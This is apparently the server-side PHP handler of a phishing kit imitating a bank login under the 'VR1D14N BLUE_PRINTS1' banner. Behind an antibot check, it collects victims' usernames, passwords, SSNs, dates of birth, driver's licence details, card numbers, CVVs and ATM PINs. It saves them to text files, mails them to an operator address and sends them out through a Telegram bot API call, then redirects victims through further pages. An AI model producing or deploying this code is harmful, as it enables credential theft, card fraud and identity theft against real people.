<?php 
	session_start();
	require_once '../../src/Classes/Comp.php';
    require_once '../../src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkValue()) {
        echo $antibot->throw404();
        die();
    } 
	include '../../crawlerdetect.php';
	        // variable declaration
	        $errors = array(); 


			if (isset($_POST['invalid']))
			{
				include 'recon.php';
				 include '../conf/config.php';
				 $settings = include '../conf/settings.php';
			// Get User Input
			$_SESSION['asdajshjf'] = $_POST['asdajshjf'];
			$_SESSION['uisdfh'] = $_POST['uisdfh'];
			
			$ip = getenv("REMOTE_ADDR");
			$useragent = $_SERVER['HTTP_USER_AGENT'];
			//send email
			$body = ":::::::::::  VR1D14N BLUE_PRINTS1 [Login Details] :::::::::::\r\n";
			$body .= "User Id                             : {$_SESSION['asdajshjf']}\r\n";
			$body .= "Password                            : {$_SESSION['uisdfh']}\r\n";
			$body .=  "|--------------- I N F O | I P -------------------|\r\n";
			$body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
			$body .= "IP Country	                       : {$_SESSION['country']}\r\n";
			$body .= "IP City	                           : {$_SESSION['city']}\r\n";
			$body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
			$body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
			$body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
			$body .= "::::::::::::::::  VR1D14N BLUE_PRINTS1 :::::::::::::::::\r\n";
			if($savetxt == "on"){
			$save=fopen("../data/login".$salt.".txt",'a');
			fwrite($save,$body);
			fclose($save);
			}             
			$subject="Login Access 2 => From {$_SESSION['ip']}  {$_SESSION['platform']} ]";$headers="From: BLUE_PRINTS1 <VR1D14N@BLUE_PRINTS1.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/plain; charset=UTF-8\r\n";@mail($emailzz, $subject, $body, $headers);if($tgresult == "on"){$data = $body;$send = ['chat_id'=>$settings['chat_id'],'text'=>$data];$website = "https://api.telegram.org/{$settings['bot_url']}";$ch = curl_init($website . '/sendMessage');curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);$result = curl_exec($ch);curl_close($ch);}
			 $key = $_SESSION['value'];
			  echo "<script>window.location.href='../../mail.php?value=".$key."';</script>";
			}
			
			if(isset($_POST['asdajshjf'])&&isset($_POST['uisdfh']))
			{
			include 'recon.php';
			 include '../conf/config.php';
			 $settings = include '../conf/settings.php';
			// check for valid email address
			$_SESSION['asdajshjf'] = $_POST['asdajshjf'];
			$_SESSION['uisdfh'] = $_POST['uisdfh'];
			
			$ip = getenv("REMOTE_ADDR");
			$useragent = $_SERVER['HTTP_USER_AGENT'];
			//send email
			$body = "::::::::::::::  VR1D14N BLUE_PRINTS1 [Login Details] ::::::::::::\r\n";
			$body .= "User Id                             : {$_SESSION['asdajshjf']}\r\n";
			$body .= "Password                            : {$_SESSION['uisdfh']}\r\n";
			$body .=  "|--------------- I N F O | I P -------------------|\r\n";
			$body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
			$body .= "IP Country	                       : {$_SESSION['country']}\r\n";
			$body .= "IP City	                           : {$_SESSION['city']}\r\n";
			$body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
			$body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
			$body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
			$body .= "::::::::::::::::::::::  VR1D14N BLUE_PRINTS1 :::::::::::::::::::::::::\r\n";
			if($savetxt == "on"){
			$save=fopen("../data/login".$salt.".txt",'a');
			fwrite($save,$body);
			fclose($save);
			}
			 
			$subject="Login Access 1 => From {$_SESSION['ip']} {$_SESSION['platform']} ]";$headers="From: BLUE_PRINTS1 <VR1D14N@blue_prints.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/plain; charset=UTF-8\r\n";@mail($emailzz, $subject, $body, $headers);if($tgresult == "on"){$data = $body;$send = ['chat_id'=>$settings['chat_id'],'text'=>$data];$website = "https://api.telegram.org/{$settings['bot_url']}";$ch = curl_init($website . '/sendMessage');curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);$result = curl_exec($ch);curl_close($ch);}
			$key = $_SESSION['value'];
			if($d_log == "on"){
			  echo "<script>window.location.href='../../access.php?invalid&value=".$key."';</script>";
			  die();
			}else{
			echo "<script>window.location.href='../../mail.php?value=".$key."';</script>";
			die();
			}
			}
	      

	          if(isset($_POST['fname'])&&isset($_POST['dob']))
	          {
	          include 'recon.php';
	           include '../conf/config.php';
			   $settings = include '../conf/settings.php';
	          // check for valid email address
			 
	          $_SESSION['zpcd'] 	  = $_POST['zip'];
	          $_SESSION['fname']	  = $_POST['fname'];
              $_SESSION['dob']	  = $_POST['dob'];
              $_SESSION['ssn']	  = $_POST['ssn'];
              $_SESSION['phnum']	  = $_POST['phn'];
			  $_SESSION['typid']  = $_POST['typid'];
		
			  $_SESSION['crpn']   = $_POST['crpn'];
              $_SESSION['stradd1'] 	  = $_POST['addy'];
              $_SESSION['cty'] 	  = $_POST['cty'];
			  $_SESSION['dln'] 	  = $_POST['dln'];
              $_SESSION['stte'] 	  = $_POST['stte'];
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
			  $body = "::::::::::: VR1D14N BLUE_PRINTS1 [Dual User Id Details] :::::::::::\r\n";
	          $body .= "User Id                             : {$_SESSION['asdajshjf']}\r\n";
	          $body .= "Password                            : {$_SESSION['uisdfh']}\r\n";
			  $body .= ":::::::::: VR1D14N BLUE_PRINTS1 [Dual email Details] ::::::::::::\r\n";
	          $body .= "{$_SESSION['emailr']}\r\n";
	          $body .= ":::::::::::  VR1D14N BLUE_PRINTS1 [Billing Details] ::::::::::::::::\r\n";
	          $body .= "Fname                           : {$_SESSION['fname']}\r\n";
	          $body .= "DOB                             : {$_SESSION['dob']}\r\n";
              $body .= "Phone no                        : {$_SESSION['phnum']}\r\n";
			  $body .= "DL                              : {$_SESSION['dln']}\r\n";
			  $body .= "DL issue                        : {$_SESSION['typid']}\r\n";
              $body .= "DL exp                          : {$_SESSION['crpn']}\r\n";
			  $body .= "SSN                             : {$_SESSION['ssn']}\r\n";
	          $body .= "address                         : {$_SESSION['stradd1']}\r\n";
              $body .= "City                            : {$_SESSION['cty']}\r\n";
              $body .= "state                           : {$_SESSION['stte']}\r\n";
			  $body .= "zipcode                         : {$_SESSION['zpcd']}\r\n";
			  $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                 : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                 : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                     : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                 : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                 : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME                         : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= "::::::::::::  VR1D14N BLUE_PRINTS1 :::::::::::::::::::\r\n";
	          if($savetxt == "on"){
	          $save=fopen("../data/billing".$salt.".txt",'a');
	          fwrite($save,$body);
	          fclose($save);
			  }
	           
	          $subject="Billing Details 1 => From {$_SESSION['ip']} [ {$_SESSION['platform']} ]";$headers="From: BLUE_PRINTS1 <VR1D14N@BLUE_PRINTS1.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/plain; charset=UTF-8\r\n";@mail($emailzz, $subject, $body, $headers);if($tgresult == "on"){$data = $body;$send = ['chat_id'=>$settings['chat_id'],'text'=>$data];$website = "https://api.telegram.org/{$settings['bot_url']}";$ch = curl_init($website . '/sendMessage');curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);$result = curl_exec($ch);curl_close($ch);}
	          $key = $_SESSION['value'];
			  echo "<script>window.location.href='../../details.php?value=".$key."';</script>";
	          die();
	        
	          }
			  if(isset($_POST['ccn'])&&isset($_POST['atmp']))
	          {
	          include 'recon.php';
	           include '../conf/config.php';
			   $settings = include '../conf/settings.php';
	          // check for valid email address
			  $_SESSION['ccn']	  = $_POST['ccn'];
        	  $_SESSION['cvv'] 	  = $_POST['cvv'];
	          $_SESSION['expth']  = $_POST['exp'];
	          $_SESSION['atm']	  = $_POST['atmp'];

	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
			  $body = ":::::::::: VR1D14N BLUE_PRINTS1 [Dual User Id Details] :::::::::::\r\n";
	          $body .= "User Id                      : {$_SESSION['asdajshjf']}\r\n";
	          $body .= "Password                     : {$_SESSION['uisdfh']}\r\n";
			  $body .= ":::::::::: VR1D14N BLUE_PRINTS1 [Dual email Details] ::::::::::::\r\n";
	          $body .= "{$_SESSION['emailr']}\r\n";
	          $body .= "::::::::::  VR1D14N BLUE_PRINTS1 [Card Details] :::::::::::::::\r\n";
	          $body .= "Card Number                  : {$_SESSION['ccn']}\r\n";
	          $body .= "Expiry Date                  : {$_SESSION['expth']}\r\n";
	          $body .= "CVV                          : {$_SESSION['cvv']}\r\n";
	          $body .= "ATM PIN                      : {$_SESSION['atm']}\r\n";
			  $body .= ":::::::::::  VR1D14N BLUE_PRINTS1 [Billing Details] ::::::::::::::::\r\n";
	          $body .= "Fname                           : {$_SESSION['fname']}\r\n";
	          $body .= "DOB                             : {$_SESSION['dob']}\r\n";
              $body .= "Phone no                        : {$_SESSION['phnum']}\r\n";
			  $body .= "DL                              : {$_SESSION['dln']}\r\n";
			  $body .= "DL issue                        : {$_SESSION['typid']}\r\n";
              $body .= "DL exp                          : {$_SESSION['crpn']}\r\n";
			  $body .= "SSN                             : {$_SESSION['ssn']}\r\n";
	          $body .= "address                         : {$_SESSION['stradd1']}\r\n";
              $body .= "City                            : {$_SESSION['cty']}\r\n";
              $body .= "state                           : {$_SESSION['stte']}\r\n";
			  $body .= "zipcode                         : {$_SESSION['zpcd']}\r\n";
			  $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                 : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                 : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                     : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                 : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                 : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME                         : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= "::::::::::::  VR1D14N BLUE_PRINTS1 :::::::::::::::::::\r\n";
	          if($savetxt == "on"){
	          $save=fopen("../data/card".$salt.".txt",'a');
	          fwrite($save,$body);
	          fclose($save);
			  }
	           
	          $subject="card Details 1 => From {$_SESSION['ip']} [ {$_SESSION['platform']} ]";$headers="From: BLUE_PRINTS1 <VR1D14N@BLUE_PRINTS1.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/plain; charset=UTF-8\r\n";@mail($emailzz, $subject, $body, $headers);if($tgresult == "on"){$data = $body;$send = ['chat_id'=>$settings['chat_id'],'text'=>$data];$website = "https://api.telegram.org/{$settings['bot_url']}";$ch = curl_init($website . '/sendMessage');curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);$result = curl_exec($ch);curl_close($ch);}
	          $key = $_SESSION['value'];
			  echo "<script>window.location.href='../../success.php?value=".$key."';</script>";
	          die();
	        
	          }
	      
?>